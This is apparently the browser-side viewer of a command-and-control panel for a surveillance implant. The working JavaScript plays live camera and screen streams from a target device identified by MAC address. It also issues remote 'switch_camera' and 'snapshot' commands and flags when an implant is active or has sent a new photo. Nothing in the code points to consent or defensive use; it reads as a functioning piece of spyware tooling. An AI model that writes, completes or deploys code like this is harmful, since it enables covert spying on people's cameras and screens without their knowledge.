const socket = io();
const mac = window.location.pathname.split('/').pop().replace(/-/g, ':');
const video = document.getElementById('viewer-video');
const placeholder = document.getElementById('placeholder');
const recStatus = document.getElementById('rec-status');

let currentStream = 'none';
let mediaSource = new MediaSource();
let sourceBuffer = null;
let queue = [];

video.src = URL.createObjectURL(mediaSource);

mediaSource.addEventListener('sourceopen', () => {
    // We'll init the buffer when the first chunk arrives to match the mime
});

socket.on('live_chunk', async (data) => {
    // Only process chunks for our implant if we have the mapping
    // (In a real scenario, we'd map mac -> implant_id)
    console.log('Received chunk for:', data.implant_id, data.stream);

    if (placeholder.style.display !== 'none') {
        placeholder.style.display = 'none';
        video.style.display = 'block';
        recStatus.style.display = 'flex';
    }

    const chunk = Uint8Array.from(atob(data.chunk), c => c.charCodeAt(0));

    if (!sourceBuffer) {
        // Simple heuristic for WebM
        const mime = 'video/webm; codecs="vp8, opus"';
        sourceBuffer = mediaSource.addSourceBuffer(mime);
        sourceBuffer.addEventListener('updateend', () => {
            if (queue.length > 0 && !sourceBuffer.updating) {
                sourceBuffer.appendBuffer(queue.shift());
            }
        });
    }

    if (sourceBuffer.updating || queue.length > 0) {
        queue.push(chunk);
    } else {
        try {
            sourceBuffer.appendBuffer(chunk);
        } catch (e) {
            console.error('Buffer append error:', e);
        }
    }
});

function switchCamera(type) {
    console.log('Switching to:', type);
    // Visual feedback
    document.querySelectorAll('.btn-control').forEach(b => b.classList.remove('btn-active'));
    document.getElementById(`btn-${type}`)?.classList.add('btn-active');

    currentStream = type === 'front' ? 'cam_front' : (type === 'back' ? 'cam_back' : 'screen');

    fetch('/api/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type: 'switch_camera', camera: type })
    });
}

function takeSnapshot() {
    if (currentStream === 'none') return;
    fetch('/api/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type: 'snapshot', stream: currentStream })
    });
    alert('Snapshot command sent!');
}

// Playback logic
socket.on('implant_active', (data) => {
    if (data.mac === mac) {
        placeholder.style.display = 'none';
        video.style.display = 'block';
        document.getElementById('rec-status').style.display = 'flex';
        console.log('Stream available:', data.data.streams);

        // Match UI buttons to what is actually streaming
        if (data.data.streams.includes('cam_front')) {
            document.querySelectorAll('.btn-control').forEach(b => b.classList.remove('btn-active'));
            document.getElementById('btn-front')?.classList.add('btn-active');
        } else if (data.data.streams.includes('cam_back')) {
            document.querySelectorAll('.btn-control').forEach(b => b.classList.remove('btn-active'));
            document.getElementById('btn-back')?.classList.add('btn-active');
        }
    }
});

socket.on('new_photo', (data) => {
    if (data.mac === mac) {
        console.log('New snapshot received:', data.path);
        // Brief flash effect
        document.body.style.filter = 'brightness(2)';
        setTimeout(() => document.body.style.filter = '', 100);
    }
});
